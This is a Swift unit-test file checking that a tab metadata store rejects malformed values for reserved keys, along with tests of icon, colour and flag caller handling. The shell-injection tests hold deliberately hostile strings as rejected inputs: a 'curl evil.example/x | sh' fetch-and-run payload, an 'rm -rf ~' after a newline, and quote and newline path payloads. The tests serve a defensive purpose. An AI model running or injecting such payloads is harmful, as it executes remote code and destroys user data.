import XCTest

#if canImport(c11_DEV)
@testable import c11_DEV
#elseif canImport(c11)
@testable import c11
#endif

/// Integration tests for the write-time validator guarding the
/// `claude.session_id` reserved key (CMUX-37 Phase 1 / B1).
///
/// The registry tests in `AgentRestartRegistryTests` cover the resolver's
/// defensive re-validation. These tests cover the other half of the
/// defence: the store must reject malformed writes so a malicious value
/// never lands in the metadata blob in the first place.
///
/// Per `CLAUDE.md`, never run locally — CI only.
final class TabMetadataStoreValidationTests: XCTestCase {

    private let store = TabMetadataStore.shared

    func testStoreAcceptsValidUUIDv4ClaudeSessionId() throws {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let result = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_id": "abc12345-ef67-890a-bcde-f0123456789a"],
            mode: .merge,
            source: .explicit
        )
        XCTAssertEqual(result.applied["claude.session_id"], true)
    }

    func testStoreRejectsShellInjectionInClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let payload = "fake; curl evil.example/x | sh"
        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": payload],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? TabMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsEmbeddedNewlineInClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let payload = "abc12345-ef67-890a-bcde-f0123456789a\nrm -rf ~"
        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": payload],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? TabMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsNonStringClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": 42],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? TabMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsNonUUIDShapes() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let shapes = [
            "too-short",
            "aaaaaaaa-1111-2222-3333", // missing last segment
            "aaaaaaaa-1111-2222-3333-444455556666ff", // last segment too long
            "AAAAAAAA_1111_2222_3333_444455556666", // underscores
            "gggggggg-1111-2222-3333-444455556666", // non-hex g
            "",
            " "
        ]
        for shape in shapes {
            XCTAssertThrowsError(
                try store.setMetadata(
                    workspaceId: workspace,
                    surfaceId: surface,
                    partial: ["claude.session_id": shape],
                    mode: .merge,
                    source: .explicit
                ),
                "store must reject '\(shape)'"
            )
        }
    }

    /// Store state must stay empty after rejected writes — the throw is
    /// supposed to happen before mutation per the reserved-key pre-check.
    func testRejectedWriteLeavesStoreUntouched() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        _ = try? store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_id": "not a uuid"],
            mode: .merge,
            source: .explicit
        )
        let (metadata, sources) = store.getMetadata(workspaceId: workspace, surfaceId: surface)
        XCTAssertNil(metadata["claude.session_id"])
        XCTAssertNil(sources["claude.session_id"])
    }

    // MARK: - claude.session_project_dir

    func testStoreAcceptsAbsolutePosixProjectDir() throws {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let result = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_project_dir": "/Users/op/repo/c11-worktrees/feat"],
            mode: .merge,
            source: .explicit
        )
        XCTAssertEqual(result.applied["claude.session_project_dir"], true)
    }

    func testStoreRejectsRelativeProjectDir() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_project_dir": "relative/path"],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? TabMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsProjectDirWithSingleQuoteOrNewline() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        // A single quote would break the registry's single-quote shell
        // escape; a newline would let an attacker append a second command
        // after the synthesized `cd ... && claude --resume`.
        let payloads = [
            "/path/with'quote",
            "/path/with\nnewline",
            "/path/with\rcr",
            "/path/with\u{0000}nul"
        ]
        for payload in payloads {
            XCTAssertThrowsError(
                try store.setMetadata(
                    workspaceId: workspace,
                    surfaceId: surface,
                    partial: ["claude.session_project_dir": payload],
                    mode: .merge,
                    source: .explicit
                ),
                "store must reject project_dir containing dangerous bytes"
            )
        }
    }

    func testStoreRejectsNonStringProjectDir() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_project_dir": 42],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? TabMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    // MARK: - C11-337 flag caller keys

    private let callerKeys = ["flag_caller_surface_id", "flag_caller_panel_id", "flag_caller_tab_id"]

    func testRaisingAFlagWritesAllThreeCallerKeys() throws {
        let workspace = UUID()
        let surface = UUID()
        let caller = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let raised = try store.mutateAttention(
            workspaceId: workspace, surfaceId: surface, flag: .raise("Synthetic decision"), callerTabId: caller
        )
        XCTAssertEqual(raised.after.flagCallerTabId, caller)
        let metadata = store.getMetadata(workspaceId: workspace, surfaceId: surface).metadata
        for key in callerKeys {
            XCTAssertEqual(metadata[key] as? String, caller.uuidString, key)
        }

        _ = try store.mutateAttention(workspaceId: workspace, surfaceId: surface, flag: .lower)
        let lowered = store.getMetadata(workspaceId: workspace, surfaceId: surface).metadata
        for key in callerKeys {
            XCTAssertNil(lowered[key], key)
        }
    }

    func testRestoredFlagReadsAnySingleCallerSpelling() {
        for key in callerKeys {
            let workspace = UUID()
            let surface = UUID()
            let caller = UUID()
            defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
            store.restoreFromSnapshot(
                workspaceId: workspace,
                surfaceId: surface,
                values: [MetadataKey.flag: "Synthetic decision", key: caller.uuidString],
                sources: [MetadataKey.flag: .init(source: .explicit, ts: 1_725_000_000)]
            )
            XCTAssertEqual(store.attentionSnapshot(workspaceId: workspace, surfaceId: surface).flagCallerTabId, caller, key)
            let metadata = store.getMetadata(workspaceId: workspace, surfaceId: surface).metadata
            for written in callerKeys {
                XCTAssertEqual(metadata[written] as? String, caller.uuidString, "\(key) -> \(written)")
            }
        }
    }

    func testSurfaceCallerKeyWinsThenPanelThenTab() {
        let surfaceCaller = UUID()
        let panelCaller = UUID()
        let tabCaller = UUID()
        XCTAssertEqual(TabMetadataStore.flagCallerValue([
            "flag_caller_surface_id": surfaceCaller.uuidString,
            "flag_caller_panel_id": panelCaller.uuidString,
            "flag_caller_tab_id": tabCaller.uuidString,
        ]), surfaceCaller.uuidString)
        XCTAssertEqual(TabMetadataStore.flagCallerValue([
            "flag_caller_panel_id": panelCaller.uuidString,
            "flag_caller_tab_id": tabCaller.uuidString,
        ]), panelCaller.uuidString)
        XCTAssertEqual(TabMetadataStore.flagCallerValue(["flag_caller_tab_id": tabCaller.uuidString]), tabCaller.uuidString)
        XCTAssertNil(TabMetadataStore.flagCallerValue([:]))

        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        store.restoreFromSnapshot(
            workspaceId: workspace,
            surfaceId: surface,
            values: [
                MetadataKey.flag: "Synthetic decision",
                "flag_caller_surface_id": surfaceCaller.uuidString,
                "flag_caller_panel_id": panelCaller.uuidString,
                "flag_caller_tab_id": tabCaller.uuidString,
            ],
            sources: [MetadataKey.flag: .init(source: .explicit, ts: 1_725_000_000)]
        )
        XCTAssertEqual(store.attentionSnapshot(workspaceId: workspace, surfaceId: surface).flagCallerTabId, surfaceCaller)
    }

    func testPanelCallerKeyIsReservedForTheAttentionService() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        XCTAssertThrowsError(try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["flag_caller_panel_id": UUID().uuidString],
            mode: .merge,
            source: .explicit
        )) { error in
            guard case .attentionRequiresService? = error as? TabMetadataStore.WriteError else {
                return XCTFail("expected attentionRequiresService, got \(error)")
            }
        }
        XCTAssertFalse(store.setInternal(
            workspaceId: workspace, surfaceId: surface, key: "flag_caller_panel_id",
            value: UUID().uuidString, source: .heuristic
        ))
    }
}

/// Canonical tab `icon` / `color` keys: validation, normalization, and the
/// blank-write-clears contract that `c11 set-tab-icon ""` relies on.
final class TabIconColorMetadataTests: XCTestCase {

    private let store = TabMetadataStore.shared

    private func write(_ partial: [String: Any], ws: UUID, tab: UUID, source: MetadataSource = .explicit) throws -> TabMetadataStore.WriteResult {
        try store.setMetadata(workspaceId: ws, surfaceId: tab, partial: partial, mode: .merge, source: source)
    }

    private func assertRejected(_ partial: [String: Any], file: StaticString = #filePath, line: UInt = #line) {
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }
        XCTAssertThrowsError(try write(partial, ws: ws, tab: tab), file: file, line: line) { error in
            XCTAssertEqual((error as? TabMetadataStore.WriteError)?.code, "reserved_key_invalid_type", file: file, line: line)
        }
    }

    func testIconIsStoredTrimmedAndReadBack() throws {
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }
        let result = try write(["icon": "  🚀 "], ws: ws, tab: tab)
        XCTAssertEqual(result.applied["icon"], true)
        XCTAssertEqual(store.metadataValue(workspaceId: ws, surfaceId: tab, key: "icon") as? String, "🚀")

        _ = try write(["icon": "sf:hammer.fill"], ws: ws, tab: tab)
        XCTAssertEqual(store.metadataValue(workspaceId: ws, surfaceId: tab, key: "icon") as? String, "sf:hammer.fill")
    }

    func testIconRejectsOverlongMultilineAndNonString() {
        assertRejected(["icon": String(repeating: "x", count: 33)])
        assertRejected(["icon": "a\nb"])
        assertRejected(["icon": 7])
        // 32 grapheme clusters is the cap, counted as characters, not bytes.
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }
        XCTAssertNoThrow(try write(["icon": String(repeating: "👩‍💻", count: 32)], ws: ws, tab: tab))
    }

    func testColorNormalizesHexAndPaletteNames() throws {
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }

        _ = try write(["color": "c0392b"], ws: ws, tab: tab)
        XCTAssertEqual(store.metadataValue(workspaceId: ws, surfaceId: tab, key: "color") as? String, "#C0392B")

        _ = try write(["color": "  Teal "], ws: ws, tab: tab)
        XCTAssertEqual(
            store.metadataValue(workspaceId: ws, surfaceId: tab, key: "color") as? String,
            WorkspaceColorSettings.defaultColorHex(named: "Teal")
        )
        XCTAssertEqual(WorkspaceColorSettings.resolvedColorHex("BLUE"), WorkspaceColorSettings.defaultColorHex(named: "Blue"))
        XCTAssertNil(WorkspaceColorSettings.resolvedColorHex("chartreuse"))
    }

    func testColorRejectsUnknownNamesAndNonStrings() {
        assertRejected(["color": "chartreuse"])
        assertRejected(["color": "#12345"])
        assertRejected(["color": 0xFF0000])
    }

    func testBlankWriteClearsIconAndColor() throws {
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }
        _ = try write(["icon": "🧪", "color": "#196F3D"], ws: ws, tab: tab)

        let result = try write(["icon": "", "color": "   "], ws: ws, tab: tab)
        XCTAssertEqual(result.applied["icon"], true)
        XCTAssertEqual(result.applied["color"], true)
        XCTAssertEqual(result.removedKeys, ["icon", "color"])
        let snapshot = store.getMetadata(workspaceId: ws, surfaceId: tab)
        XCTAssertNil(snapshot.metadata["icon"])
        XCTAssertNil(snapshot.metadata["color"])
        XCTAssertNil(snapshot.sources["icon"])
        XCTAssertNil(snapshot.sources["color"])
    }

    func testBlankWriteRespectsPrecedence() throws {
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }
        _ = try write(["icon": "🧪"], ws: ws, tab: tab, source: .explicit)
        let result = try write(["icon": ""], ws: ws, tab: tab, source: .declare)
        XCTAssertEqual(result.applied["icon"], false)
        XCTAssertEqual(result.reasons["icon"], "lower_precedence")
        XCTAssertEqual(store.metadataValue(workspaceId: ws, surfaceId: tab, key: "icon") as? String, "🧪")
    }

    func testIconRejectsUnknownSFSymbolAcceptsKnownOne() throws {
        assertRejected(["icon": "sf:not.a.real.symbol.name"])
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }
        XCTAssertNoThrow(try write(["icon": "sf:star.fill"], ws: ws, tab: tab))
        // A plain glyph that merely starts with "sf" is not a symbol reference.
        XCTAssertNoThrow(try write(["icon": "sfx"], ws: ws, tab: tab))
    }

    func testDefaultPaletteIsTheSharedListAndEveryNameResolves() {
        let isolated = UserDefaults(suiteName: "c11-palette-\(UUID())")!
        XCTAssertEqual(
            WorkspaceColorSettings.defaultPalette.map(\.name),
            DefaultColorPalette.entries.map(\.name)
        )
        for entry in DefaultColorPalette.entries {
            XCTAssertEqual(WorkspaceColorSettings.resolvedColorHex(entry.name.lowercased(), defaults: isolated), entry.hex)
        }
        XCTAssertNil(WorkspaceColorSettings.resolvedColorHex("aurora", defaults: isolated))
    }

    func testInternalWriteNormalizesColor() {
        let ws = UUID(), tab = UUID()
        defer { store.removeSurface(workspaceId: ws, surfaceId: tab) }
        XCTAssertTrue(store.setInternal(workspaceId: ws, surfaceId: tab, key: "color", value: "#aabbcc", source: .explicit))
        XCTAssertEqual(store.metadataValue(workspaceId: ws, surfaceId: tab, key: "color") as? String, "#AABBCC")
        XCTAssertFalse(store.setInternal(workspaceId: ws, surfaceId: tab, key: "color", value: "", source: .explicit))
    }
}
